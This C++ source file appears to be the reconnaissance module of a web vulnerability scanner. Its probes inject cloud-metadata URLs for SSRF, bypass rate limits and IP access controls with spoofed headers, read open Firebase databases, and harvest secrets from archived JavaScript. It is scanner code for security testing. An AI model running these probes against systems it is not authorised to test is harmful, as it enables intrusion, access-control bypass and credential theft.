/// @file scanners/recon.cpp
/// @brief Reconnaissance: API version bypass, rate limit bypass, cloud
///        metadata, Firebase misconfig, wayback secrets, tech-specific vulns,
///        IP header spoofing.
#include <sstream>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// API version bypass — access older/newer API versions.
std::vector<Finding> scan_api_version_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> versions = {"/api/v1/", "/api/v2/", "/api/v3/", "/v1/", "/v2/", "/v3/"};
  const std::vector<std::string> endpoints = {"users", "admin", "config", "settings", "debug"};

  for (const auto& ver : versions) {
    for (const auto& ep : endpoints) {
      auto resp = http.get(base + ver + ep);
      if (resp.status_code == 200 && resp.body.size() > 50) {
        findings.push_back({"API Version Bypass", "medium", base + ver + ep, "Accessible API endpoint", "", "", ""});
      }
    }
  }
  return findings;
}

/// Rate limit bypass via header manipulation.
std::vector<Finding> scan_rate_limit_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string url = crawl.urls[0];

  const std::vector<std::pair<std::string, std::string>> bypass_headers = {{"X-Forwarded-For", "127.0.0.1"},
                                                                           {"X-Real-IP", "127.0.0.1"},
                                                                           {"X-Originating-IP", "127.0.0.1"},
                                                                           {"X-Client-IP", "127.0.0.1"},
                                                                           {"True-Client-IP", "127.0.0.1"}};

  // First trigger rate limit.
  for (int i = 0; i < 20; ++i) http.get(url);
  auto limited = http.get(url);
  if (limited.status_code != 429) return findings;

  // Try bypass.
  for (const auto& [header, value] : bypass_headers) {
    auto resp = http.get(url, {{header, value}});
    if (resp.status_code == 200) {
      findings.push_back({"Rate Limit Bypass", "medium", url, "Bypass via " + header, "", value, ""});
      break;
    }
  }
  return findings;
}

/// Cloud metadata access from various providers.
std::vector<Finding> scan_cloud_metadata(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::vector<std::pair<std::string, std::string>> endpoints = {
      {"http://169.254.169.254/latest/meta-data/", "AWS"},
      {"http://metadata.google.internal/computeMetadata/v1/", "GCP"},
      {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"},
      {"http://100.100.100.200/latest/meta-data/", "Alibaba"}};

  for (const auto& url : crawl.urls) {
    auto targets = get_targets(crawl, url, "url");
    for (const auto& [base, param] : targets) {
      for (const auto& [meta_url, provider] : endpoints) {
        auto resp = http.get(base + meta_url);
        if (resp.status_code == 200 && resp.body.size() > 10) {
          findings.push_back(
              {"Cloud Metadata", "critical", url, provider + " metadata accessible via SSRF", param, meta_url, resp.body.substr(0, 100)});
        }
      }
    }
  }
  return findings;
}

/// Firebase misconfiguration.
std::vector<Finding> scan_firebase(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  // Look for Firebase references in page source.
  auto resp = http.get(crawl.urls[0]);
  std::regex fb_re(R"(([a-z0-9-]+)\.firebaseio\.com)");
  std::smatch match;
  if (!std::regex_search(resp.body, match, fb_re)) return findings;

  std::string fb_url = "https://" + match[0].str() + "/.json";
  auto fb_resp = http.get(fb_url);
  if (fb_resp.status_code == 200 && fb_resp.body != "null" && fb_resp.body.size() > 2) {
    findings.push_back({"Firebase Misconfig", "high", fb_url, "Firebase database publicly readable", "", "", ""});
  }
  return findings;
}

/// Wayback secrets — find leaked secrets in archived pages.
std::vector<Finding> scan_wayback_secrets(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  size_t start = base.find("://") + 3;
  std::string domain = base.substr(start);

  std::string wb_url = "https://web.archive.org/cdx/search/cdx?url=" + domain +
                       "/*&output=text&fl=original&filter=mimetype:application/"
                       "javascript&limit=20";
  auto resp = http.get(wb_url);
  if (resp.status_code != 200) return findings;

  std::regex secret_re(R"re((?:api[_-]?key|secret|token|password|auth)['":\s]*['"]([a-zA-Z0-9_\-]{16,})['"])re");
  std::istringstream stream(resp.body);
  std::string line;
  while (std::getline(stream, line)) {
    if (line.empty()) continue;
    auto js_resp = http.get(line);
    std::smatch m;
    if (std::regex_search(js_resp.body, m, secret_re)) {
      findings.push_back({"Wayback Secret", "high", line, "Potential secret in archived JS", "", "", ""});
      break;
    }
  }
  return findings;
}

/// IP header spoofing — bypass IP-based access controls.
std::vector<Finding> scan_ip_header_spoofing(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Try accessing admin with spoofed internal IP.
  const std::vector<std::string> admin_paths = {"/admin", "/internal", "/debug", "/status"};
  const std::vector<std::pair<std::string, std::string>> spoof_headers = {
      {"X-Forwarded-For", "127.0.0.1"}, {"X-Real-IP", "10.0.0.1"}, {"X-Originating-IP", "192.168.1.1"}};

  for (const auto& path : admin_paths) {
    auto normal = http.get(base + path);
    if (normal.status_code != 403) continue;

    for (const auto& [header, value] : spoof_headers) {
      auto resp = http.get(base + path, {{header, value}});
      if (resp.status_code == 200) {
        findings.push_back({"IP Spoofing Bypass", "high", base + path, "Access control bypassed via " + header, "", value, ""});
        break;
      }
    }
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_recon_scanners() {
  return {
      {"API Version Bypass", scan_api_version_bypass}, {"Rate Limit Bypass", scan_rate_limit_bypass},
      {"Cloud Metadata", scan_cloud_metadata},         {"Firebase Misconfig", scan_firebase},
      {"Wayback Secrets", scan_wayback_secrets},       {"IP Header Spoofing", scan_ip_header_spoofing},
  };
}

}  // namespace apex
